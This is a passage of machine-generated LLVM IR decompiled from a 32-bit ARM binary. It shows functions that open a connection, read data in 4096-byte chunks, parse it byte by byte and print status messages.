dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f50, %dec_label_pc_8f74
  %v4_8fb0 = load i32, i32* %stack_var_-5224, align 4
  %v1_8fb4 = add i32 %v4_8fb0, 4
  %v1_8fb8 = inttoptr i32 %v1_8fb4 to i32*
  %v2_8fb8 = load i32, i32* %v1_8fb8, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_185cc.37 to i32), i32* @r1, align 4
  %v4_8fc8 = inttoptr i32 %v2_8fb8 to i8*
  %v5_8fc8 = call i32 @function_f42c(i8* %v4_8fc8, i32 ptrtoint ([8 x i8]* @global_var_185cc.37 to i32), i32 7)
  %v2_8fd0 = icmp eq i32 %v5_8fc8, 0
  br i1 %v2_8fd0, label %dec_label_pc_8fd8, label %dec_label_pc_9010

dec_label_pc_8fd8:                                ; preds = %dec_label_pc_8fa4
  store i32 %v2_8eb0, i32* @lr, align 4
  %v4_8fe4 = load i32, i32* %stack_var_-5224, align 4
  %v1_8fe8 = add i32 %v4_8fe4, 4
  %v1_8fec = inttoptr i32 %v1_8fe8 to i32*
  %v2_8fec = load i32, i32* %v1_8fec, align 4
  %v1_8ff0 = add i32 %v2_8fec, 7
  store i32 %v1_8ff0, i32* @r1, align 4
  %v2_9008 = bitcast i32* %stack_var_-1108 to i8*
  %v3_9008 = call i32 @function_f53c(i8* %v2_9008, i32 %v1_8ff0)
  br label %dec_label_pc_9040

dec_label_pc_9010:                                ; preds = %dec_label_pc_8fa4
  %v4_901c = load i32, i32* %stack_var_-5224, align 4
  %v1_9020 = add i32 %v4_901c, 4
  %v1_9024 = inttoptr i32 %v1_9020 to i32*
  %v2_9024 = load i32, i32* %v1_9024, align 4
  store i32 %v2_9024, i32* @r1, align 4
  %v2_903c = bitcast i32* %stack_var_-1108 to i8*
  %v3_903c = call i32 @function_f53c(i8* %v2_903c, i32 %v2_9024)
  br label %dec_label_pc_9040

dec_label_pc_9040:                                ; preds = %dec_label_pc_8fd8, %dec_label_pc_9010
  %v2_9064.pre-phi = ptrtoint i32* %stack_var_-1108 to i32
  br label %dec_label_pc_9058

dec_label_pc_904c:                                ; preds = %dec_label_pc_907c
  %v1_9050 = add i32 %storemerge5, 1
  br label %dec_label_pc_9058

dec_label_pc_9058:                                ; preds = %dec_label_pc_9040, %dec_label_pc_904c
  %storemerge5 = phi i32 [ 0, %dec_label_pc_9040 ], [ %v1_9050, %dec_label_pc_904c ]
  store i32 %storemerge5, i32* @r4, align 4
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v0_906c = call i32 @function_f2e0()
  %v0_9074 = load i32, i32* @r4, align 4
  %v3_9074 = icmp ult i32 %v0_9074, %v0_906c
  br i1 %v3_9074, label %dec_label_pc_907c, label %dec_label_pc_90a0

dec_label_pc_907c:                                ; preds = %dec_label_pc_9058
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_908c = add i32 %storemerge5, %v2_8eb0
  %v2_9090 = add i32 %v2_908c, -1084
  %v1_9094 = inttoptr i32 %v2_9090 to i8*
  %v2_9094 = load i8, i8* %v1_9094, align 1
  %v7_9098 = icmp eq i8 %v2_9094, 47
  br i1 %v7_9098, label %dec_label_pc_90a0, label %dec_label_pc_904c

dec_label_pc_90a0:                                ; preds = %dec_label_pc_9058, %dec_label_pc_907c
  %v2_90b0 = add i32 %v2_8eb0, -1084
  %v2_90b4 = add i32 %v2_90b0, %storemerge5
  %v3_90bc = inttoptr i32 %v2_90b4 to i8*
  store i8 0, i8* %v3_90bc, align 1
  store i32 2, i32* %stack_var_-84, align 4
  %v1_90cc = call i32 @function_f8a4(i32 80)
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v1_90e8 = call i32 @function_fa50(i32 %v2_9064.pre-phi)
  %v3_90f8 = icmp eq i32 %v1_90e8, -1
  br i1 %v3_90f8, label %dec_label_pc_9100, label %dec_label_pc_9184

dec_label_pc_9100:                                ; preds = %dec_label_pc_90a0
  store i32 %v2_9064.pre-phi, i32* @r0, align 4
  %v1_9110 = call i32 @function_fa78(i32 %v2_9064.pre-phi)
  %v2_9120 = icmp eq i32 %v1_9110, 0
  br i1 %v2_9120, label %dec_label_pc_9128, label %dec_label_pc_9158

dec_label_pc_9128:                                ; preds = %dec_label_pc_9100
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_185d4.39 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_914c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_185d4.39 to i32))
  %v1_9154 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_9158

dec_label_pc_9158:                                ; preds = %dec_label_pc_9100, %dec_label_pc_9128
  %v1_915c = add i32 %v1_9110, 16
  %v2_915c = inttoptr i32 %v1_915c to i32*
  %v3_915c = load i32, i32* %v2_915c, align 4
  %v1_9160 = inttoptr i32 %v3_915c to i32*
  %v2_9160 = load i32, i32* %v1_9160, align 4
  store i32 %v2_9160, i32* @r1, align 4
  %v1_9168 = add i32 %v1_9110, 12
  %v2_9168 = inttoptr i32 %v1_9168 to i32*
  %v3_9168 = load i32, i32* %v2_9168, align 4
  store i32 %v3_9168, i32* @r2, align 4
  %v2_9174 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_9174, i32* @r3, align 4
  store i32 %v2_9174, i32* @r0, align 4
  %v0_917c = call i32 @function_f350()
  br label %dec_label_pc_918c

dec_label_pc_9184:                                ; preds = %dec_label_pc_90a0
  store i32 %v1_90e8, i32* %stack_var_-80, align 4
  br label %dec_label_pc_918c

dec_label_pc_918c:                                ; preds = %dec_label_pc_9158, %dec_label_pc_9184
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_91a0 = bitcast i32* %stack_var_-76 to i8*
  %v3_91a0 = call i32 @function_f240(i8* %v2_91a0, i32 0)
  %v2_91a4 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_91a4, i32* %r1.global-to-local, align 4
  %v3_91b4 = call i32 @function_fb6c(i32 %v3_8f5c, i32 %v2_91a4, i32 16)
  %v2_91bc = icmp eq i32 %v3_91b4, 0
  br i1 %v2_91bc, label %dec_label_pc_91f4, label %dec_label_pc_91c4

dec_label_pc_91c4:                                ; preds = %dec_label_pc_918c
  store i32 ptrtoint ([39 x i8]* @global_var_185fc.41 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_91e8 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_185fc.41 to i32))
  %v1_91f0 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_918c, %dec_label_pc_91c4
  %v2_9208 = or i32 %v2_9064.pre-phi, 1
  %v1_920c = add i32 %v2_9208, %storemerge5
  store i32 %v1_920c, i32* @r2, align 4
  store i32 ptrtoint ([276 x i8]* @global_var_18624.43 to i32), i32* %r1.global-to-local, align 4
  %v3_9224 = call i32 @function_8398(i32 %v3_8f5c, i32 ptrtoint ([276 x i8]* @global_var_18624.43 to i32))
  store i32 ptrtoint ([28 x i8]* @global_var_18738.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_924c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_18738.45 to i32))
  %v4_925c = load i32, i32* %stack_var_-5224, align 4
  %v1_9260 = add i32 %v4_925c, 8
  %v1_9264 = inttoptr i32 %v1_9260 to i32*
  %v2_9264 = load i32, i32* %v1_9264, align 4
  store i32 %v2_9264, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18754.47 to i32), i32* @r1, align 4
  %v3_9270 = call i32 @function_cfd8(i32 %v2_9264, i32 ptrtoint ([3 x i8]* @global_var_18754.47 to i32))
  %v2_9284 = ptrtoint i32* %stack_var_-5204 to i32
  br label %dec_label_pc_927c

dec_label_pc_927c:                                ; preds = %dec_label_pc_9410, %dec_label_pc_91f4
  store i32 %v2_9284, i32* %r1.global-to-local, align 4
  %v4_9298 = call i32 @function_fbd8(i32 %v3_8f5c, i32 %v2_9284, i32 4096, i32 0)
  %tmp53 = icmp slt i32 %v4_9298, 1
  br i1 %tmp53, label %dec_label_pc_9430.loopexit9, label %dec_label_pc_92b0

dec_label_pc_92b0:                                ; preds = %dec_label_pc_927c
  %v8_92c0 = icmp sgt i32 %v4_9298, 4095
  br i1 %v8_92c0, label %dec_label_pc_92f0.lr.ph, label %dec_label_pc_92c4

dec_label_pc_92c4:                                ; preds = %dec_label_pc_92b0
  store i32 %v2_8eb0, i32* @lr, align 4
  %v2_92d8 = add i32 %v4_9298, %v2_9284
  %v3_92e0 = inttoptr i32 %v2_92d8 to i8*
  store i8 0, i8* %v3_92e0, align 1
  br label %dec_label_pc_92f0.lr.ph

dec_label_pc_92f0.lr.ph:                          ; preds = %dec_label_pc_92c4, %dec_label_pc_92b0
  br label %dec_label_pc_92f0

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92f0.lr.ph, %dec_label_pc_9410
  %storemerge688 = phi i32 [ 0, %dec_label_pc_92f0.lr.ph ], [ %v1_9414, %dec_label_pc_9410 ]
  %v2_9304 = add i32 %storemerge688, %v2_9284
  store i32 ptrtoint ([5 x i8]* @global_var_18758.49 to i32), i32* @r1, align 4
  %v4_9314 = inttoptr i32 %v2_9304 to i8*
  %v5_9314 = call i32 @function_f42c(i8* %v4_9314, i32 ptrtoint ([5 x i8]* @global_var_18758.49 to i32), i32 4)
  %v2_931c = icmp eq i32 %v5_9314, 0
  br i1 %v2_931c, label %dec_label_pc_9324, label %dec_label_pc_9410

dec_label_pc_9324:                                ; preds = %dec_label_pc_92f0
  %v1_9328 = add i32 %storemerge688, 4
  %v1_9340 = add i32 %v3_9270, 52
  %v2_9340 = inttoptr i32 %v1_9340 to i32*
  %v1_9350 = add i32 %v3_9270, 16
  %v2_9350 = inttoptr i32 %v1_9350 to i32*
  %v1_9358 = add i32 %v3_9270, 28
  %v2_9358 = inttoptr i32 %v1_9358 to i32*
  %v5_940877 = icmp slt i32 %v1_9328, %v4_9298
  br i1 %v5_940877, label %dec_label_pc_9334, label %dec_label_pc_9430

dec_label_pc_9334:                                ; preds = %dec_label_pc_9324, %dec_label_pc_93f0
  %storemerge778 = phi i32 [ %v1_93f4, %dec_label_pc_93f0 ], [ %v1_9328, %dec_label_pc_9324 ]
  %v3_9340 = load i32, i32* %v2_9340, align 4
  %v2_9344 = icmp eq i32 %v3_9340, 0
  br i1 %v2_9344, label %dec_label_pc_93c8, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_9334
  %v3_9350 = load i32, i32* %v2_9350, align 4
  %v3_9358 = load i32, i32* %v2_9358, align 4
  %v3_935c = icmp ult i32 %v3_9350, %v3_9358
  br i1 %v3_935c, label %dec_label_pc_9364, label %dec_label_pc_939c

dec_label_pc_9364:                                ; preds = %dec_label_pc_934c
  %v3_9368 = load i32, i32* %v2_9350, align 4
  store i32 %v3_9368, i32* %r1.global-to-local, align 4
  %v2_9380 = add i32 %storemerge778, %v2_9284
  %v1_9384 = inttoptr i32 %v2_9380 to i8*
  %v2_9384 = load i8, i8* %v1_9384, align 1
  %v3_9388 = inttoptr i32 %v3_9368 to i8*
  store i8 %v2_9384, i8* %v3_9388, align 1
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* %v2_9350, align 4
  br label %dec_label_pc_93f0

dec_label_pc_939c:                                ; preds = %dec_label_pc_934c
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_93b0 = add i32 %storemerge778, %v2_9284
  %v1_93b4 = inttoptr i32 %v2_93b0 to i8*
  %v2_93b4 = load i8, i8* %v1_93b4, align 1
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_93c0 = call i32 @function_f048(i8 %v2_93b4, i32 %v3_9270)
  br label %dec_label_pc_93f0

dec_label_pc_93c8:                                ; preds = %dec_label_pc_9334
  %v2_93dc = add i32 %storemerge778, %v2_9284
  %v1_93e0 = inttoptr i32 %v2_93dc to i8*
  %v2_93e0 = load i8, i8* %v1_93e0, align 1
  %v3_93e0 = zext i8 %v2_93e0 to i32
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_93ec = call i32 @function_eb20(i32 %v3_93e0, i32 %v3_9270, i32 %storemerge778)
  br label %dec_label_pc_93f0

dec_label_pc_93f0:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9364, %dec_label_pc_93c8
  %v1_93f4 = add i32 %storemerge778, 1
  %v5_9408 = icmp slt i32 %v1_93f4, %v4_9298
  br i1 %v5_9408, label %dec_label_pc_9334, label %dec_label_pc_9430

dec_label_pc_9410:                                ; preds = %dec_label_pc_92f0
  %v1_9414 = add nuw nsw i32 %storemerge688, 1
  %v5_9428 = icmp slt i32 %v1_9414, %v4_9298
  br i1 %v5_9428, label %dec_label_pc_92f0, label %dec_label_pc_927c

dec_label_pc_9430.loopexit9:                      ; preds = %dec_label_pc_927c
  %.pre = add i32 %v3_9270, 52
  %.pre17 = inttoptr i32 %.pre to i32*
  %.pre18 = add i32 %v3_9270, 16
  %.pre19 = inttoptr i32 %.pre18 to i32*
  %.pre20 = add i32 %v3_9270, 28
  %.pre21 = inttoptr i32 %.pre20 to i32*
  br label %dec_label_pc_9430

dec_label_pc_9430:                                ; preds = %dec_label_pc_9324, %dec_label_pc_93f0, %dec_label_pc_9430.loopexit9
  %v2_950c.pre-phi = phi i32* [ %.pre21, %dec_label_pc_9430.loopexit9 ], [ %v2_9358, %dec_label_pc_93f0 ], [ %v2_9358, %dec_label_pc_9324 ]
  %v2_9504.pre-phi = phi i32* [ %.pre19, %dec_label_pc_9430.loopexit9 ], [ %v2_9350, %dec_label_pc_93f0 ], [ %v2_9350, %dec_label_pc_9324 ]
  %v2_94f4.pre-phi = phi i32* [ %.pre17, %dec_label_pc_9430.loopexit9 ], [ %v2_9340, %dec_label_pc_93f0 ], [ %v2_9340, %dec_label_pc_9324 ]
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_18760.51 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9470 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_18760.51 to i32))
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_95a4, %dec_label_pc_9430
  store i32 %v2_9284, i32* %r1.global-to-local, align 4
  %v4_9490 = call i32 @function_fbd8(i32 %v3_8f5c, i32 %v2_9284, i32 4096, i32 0)
  %tmp55 = icmp slt i32 %v4_9490, 1
  br i1 %tmp55, label %dec_label_pc_95c4, label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9474
  %v8_94b8 = icmp sgt i32 %v4_9490, 4095
  br i1 %v8_94b8, label %dec_label_pc_94e8.lr.ph, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a8
  %v2_94d0 = add i32 %v4_9490, %v2_9284
  %v3_94d8 = inttoptr i32 %v2_94d0 to i8*
  store i8 0, i8* %v3_94d8, align 1
  br label %dec_label_pc_94e8.lr.ph

dec_label_pc_94e8.lr.ph:                          ; preds = %dec_label_pc_94bc, %dec_label_pc_94a8
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94e8.lr.ph, %dec_label_pc_95a4
  %storemerge868 = phi i32 [ 0, %dec_label_pc_94e8.lr.ph ], [ %v1_95a8, %dec_label_pc_95a4 ]
  %v3_94f4 = load i32, i32* %v2_94f4.pre-phi, align 4
  %v2_94f8 = icmp eq i32 %v3_94f4, 0
  br i1 %v2_94f8, label %dec_label_pc_957c, label %dec_label_pc_9500

dec_label_pc_9500:                                ; preds = %dec_label_pc_94e8
  %v3_9504 = load i32, i32* %v2_9504.pre-phi, align 4
  %v3_950c = load i32, i32* %v2_950c.pre-phi, align 4
  %v3_9510 = icmp ult i32 %v3_9504, %v3_950c
  br i1 %v3_9510, label %dec_label_pc_9518, label %dec_label_pc_9550

dec_label_pc_9518:                                ; preds = %dec_label_pc_9500
  %v3_951c = load i32, i32* %v2_9504.pre-phi, align 4
  store i32 %v3_951c, i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  %v2_9534 = add i32 %storemerge868, %v2_9284
  %v1_9538 = inttoptr i32 %v2_9534 to i8*
  %v2_9538 = load i8, i8* %v1_9538, align 1
  %v3_953c = inttoptr i32 %v3_951c to i8*
  store i8 %v2_9538, i8* %v3_953c, align 1
  %v0_9540 = load i32, i32* %r1.global-to-local, align 4
  %v1_9540 = add i32 %v0_9540, 1
  store i32 %v1_9540, i32* %v2_9504.pre-phi, align 4
  br label %dec_label_pc_95a4

dec_label_pc_9550:                                ; preds = %dec_label_pc_9500
  %v2_9564 = add i32 %storemerge868, %v2_9284
  %v1_9568 = inttoptr i32 %v2_9564 to i8*
  %v2_9568 = load i8, i8* %v1_9568, align 1
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_9574 = call i32 @function_f048(i8 %v2_9568, i32 %v3_9270)
  br label %dec_label_pc_95a4

dec_label_pc_957c:                                ; preds = %dec_label_pc_94e8
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v2_9590 = add i32 %storemerge868, %v2_9284
  %v1_9594 = inttoptr i32 %v2_9590 to i8*
  %v2_9594 = load i8, i8* %v1_9594, align 1
  %v3_9594 = zext i8 %v2_9594 to i32
  store i32 %v3_9270, i32* %r1.global-to-local, align 4
  %v3_95a0 = call i32 @function_eb20(i32 %v3_9594, i32 %v3_9270, i32 %storemerge868)
  br label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9550, %dec_label_pc_9518, %dec_label_pc_957c
  %v1_95a8 = add nuw nsw i32 %storemerge868, 1
  %v5_95bc = icmp slt i32 %v1_95a8, %v4_9490
  br i1 %v5_95bc, label %dec_label_pc_94e8, label %dec_label_pc_9474

dec_label_pc_95c4:                                ; preds = %dec_label_pc_9474
  %v1_95c8 = inttoptr i32 %v3_9270 to i16*
  %v2_95c8 = call i32 @function_ce24(i16* %v1_95c8)
  %v1_95d0 = call i32 @function_cda4(i32 %v3_8f5c)
  %v1_95d8 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_95dc

dec_label_pc_95dc:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_95c4
  %v1_95e4 = phi i32 [ %v1_8ef8, %dec_label_pc_8e94 ], [ %v1_95d8, %dec_label_pc_95c4 ]
  ret i32 %v1_95e4

; uselistorder directives
  uselistorder i32 %storemerge868, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_9490, { 1, 0, 2, 3 }
  uselistorder i32* %v2_9504.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_93f4, { 1, 0 }
  uselistorder i32 %storemerge778, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge688, { 1, 0, 2 }
  uselistorder i32 %v4_9298, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_9284, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v3_9270, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %v2_91a4, { 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_9064.pre-phi, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8eb0, { 8, 7, 9, 6, 5, 4, 10, 1, 0, 3, 11, 2, 12, 13 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 (i32, i32, i32)* @function_eb20, { 1, 0 }
  uselistorder i32 -1084, { 0, 2, 3, 4, 1 }
  uselistorder i32 %arg2, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_95dc, { 1, 0 }
  uselistorder label %dec_label_pc_95a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_94e8, { 1, 0 }
  uselistorder label %dec_label_pc_9430, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9334, { 1, 0 }
  uselistorder label %dec_label_pc_92f0, { 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_918c, { 1, 0 }
  uselistorder label %dec_label_pc_9158, { 1, 0 }
  uselistorder label %dec_label_pc_90a0, { 1, 0 }
  uselistorder label %dec_label_pc_9058, { 1, 0 }
  uselistorder label %dec_label_pc_9040, { 1, 0 }
  uselistorder label %dec_label_pc_8fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8f50, { 1, 0 }
}

define i32 @function_9610(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9610:
  %tmp25 = call i8 @__decompiler_undefined_function_4()
  %tmp26 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  store i32 38428, i32* %stack_var_-4, align 4
  %v2_9618 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9618, i32* @fp, align 4
  %v2_9640 = load i32, i32* @global_var_22eac.20, align 4
  %v7_9660 = icmp eq i32 %v2_9640, 1
  br i1 %v7_9660, label %dec_label_pc_9668, label %dec_label_pc_96c4

dec_label_pc_9668:                                ; preds = %dec_label_pc_9610
  store i32 %arg2, i32* @r2, align 4
  %v3_96bc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_18778.55 to i32))
  br label %dec_label_pc_9768

dec_label_pc_96c4:                                ; preds = %dec_label_pc_9610
  %v2_9634 = load i8*, i8** @global_var_22ea8.18, align 4
  %v3_9634 = ptrtoint i8* %v2_9634 to i32
  store i32 %v3_9634, i32* @lr, align 4
  %v3_9708 = sext i8 %tmp26 to i32
  store i32 %v3_9708, i32* @r4, align 4
  %v3_9718 = sext i8 %tmp25 to i32
  store i32 %v3_9718, i32* @r5, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9764 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_18798.57 to i32))
  br label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %dec_label_pc_9668, %dec_label_pc_96c4
  %storemerge = phi i32 [ %v3_9764, %dec_label_pc_96c4 ], [ %v3_96bc, %dec_label_pc_9668 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9768, { 1, 0 }
}

define i32 @function_9784(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9784:
  %stack_var_-4 = alloca i32, align 4
  store i32 38800, i32* %stack_var_-4, align 4
  %v2_978c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_978c, i32* @fp, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_97b0 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_187c8.59 to i32))
  ret i32 %v3_97b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_97c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_97c4:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 38864, i32* %stack_var_-4, align 4
  %v2_97cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_97cc, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v7_97e8 = icmp eq i32 %arg3, 1
  br i1 %v7_97e8, label %dec_label_pc_9804, label %dec_label_pc_97f0

dec_label_pc_97f0:                                ; preds = %dec_label_pc_97c4
  store i32 %arg2, i32* @r2, align 4
  %v3_97fc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_187e8.61 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9804:                                ; preds = %dec_label_pc_97c4
  %v1_9808 = add i32 %arg4, 4
  %v1_980c = inttoptr i32 %v1_9808 to i32*
  %v2_980c = load i32, i32* %v1_980c, align 4
  store i32 %v2_980c, i32* @r0, align 4
  %v0_9814 = call i32 @function_f2e0()
  %tmp = icmp ult i32 %v0_9814, 10
  br i1 %tmp, label %dec_label_pc_9838, label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %dec_label_pc_9804
  store i32 %arg2, i32* @r2, align 4
  %v3_9830 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_18800.63 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9838:                                ; preds = %dec_label_pc_9804
  %v3_9838 = load i32, i32* %stack_var_-32, align 4
  %v1_983c = add i32 %v3_9838, 4
  %v1_9840 = inttoptr i32 %v1_983c to i32*
  %v2_9840 = load i32, i32* %v1_9840, align 4
  store i32 %v2_9840, i32* @r2, align 4
  %v3_9850 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_18838.65 to i32))
  br label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9824, %dec_label_pc_97f0, %dec_label_pc_9838
  %v1_985c = phi i32 [ %v3_9830, %dec_label_pc_9824 ], [ %v3_97fc, %dec_label_pc_97f0 ], [ %v3_9850, %dec_label_pc_9838 ]
  ret i32 %v1_985c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9854, { 2, 0, 1 }
}

define i32 @function_986c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_986c:
  %stack_var_-4 = alloca i32, align 4
  store i32 39032, i32* %stack_var_-4, align 4
  %v2_9874 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9874, i32* @fp, align 4
  %v7_9890 = icmp eq i32 %arg3, 1
  br i1 %v7_9890, label %dec_label_pc_98e4, label %dec_label_pc_9898

dec_label_pc_9898:                                ; preds = %dec_label_pc_986c
  store i32 %arg2, i32* @r2, align 4
  %v3_98a4 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_18844.67 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_98dc = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_18888.74 to i32))
  br label %dec_label_pc_997c

dec_label_pc_98e4:                                ; preds = %dec_label_pc_986c
  %v2_98e8 = load i8, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  %v2_98ec = icmp eq i8 %v2_98e8, 0
  br i1 %v2_98ec, label %dec_label_pc_9908, label %dec_label_pc_98f4

dec_label_pc_98f4:                                ; preds = %dec_label_pc_98e4
  store i32 %arg2, i32* @r2, align 4
  %v3_9900 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_188ac.76 to i32))
  br label %dec_label_pc_997c

dec_label_pc_9908:                                ; preds = %dec_label_pc_98e4
  %v1_990c = add i32 %arg4, 4
  %v1_9910 = inttoptr i32 %v1_990c to i32*
  %v2_9910 = load i32, i32* %v1_9910, align 4
  store i32 %v2_9910, i32* @r0, align 4
  %v0_9918 = call i32 @function_f2e0()
  %tmp = icmp ult i32 %v0_9918, 255
  br i1 %tmp, label %dec_label_pc_993c, label %dec_label_pc_9928

dec_label_pc_9928:                                ; preds = %dec_label_pc_9908
  store i32 %arg2, i32* @r2, align 4
  %v3_9934 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_188cc.78 to i32))
  br label %dec_label_pc_997c

dec_label_pc_993c:                                ; preds = %dec_label_pc_9908
  store i8 1, i8* bitcast (i8** @global_var_22ea4.8 to i8*), align 4
  store i32 256, i32* @r2, align 4
  %v3_9954 = call i32 @function_f240(i8* bitcast (i32* @global_var_25500.80 to i8*), i32 0)
  %v2_9960 = load i32, i32* %v1_9910, align 4
  store i32 %v2_9960, i32* @r1, align 4
  %v3_996c = call i32 @function_f53c(i8* bitcast (i32* @global_var_25500.80 to i8*), i32 %v2_9960)
  %v3_9978 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_188f4.82 to i32))
  br label %dec_label_pc_997c

dec_label_pc_997c:                                ; preds = %dec_label_pc_9928, %dec_label_pc_98f4, %dec_label_pc_9898, %dec_label_pc_993c
  %v1_9984 = phi i32 [ %v3_9934, %dec_label_pc_9928 ], [ %v3_9900, %dec_label_pc_98f4 ], [ %v3_98dc, %dec_label_pc_9898 ], [ %v3_9978, %dec_label_pc_993c ]
  ret i32 %v1_9984

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_997c, { 3, 0, 1, 2 }
}

define i32 @function_99ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
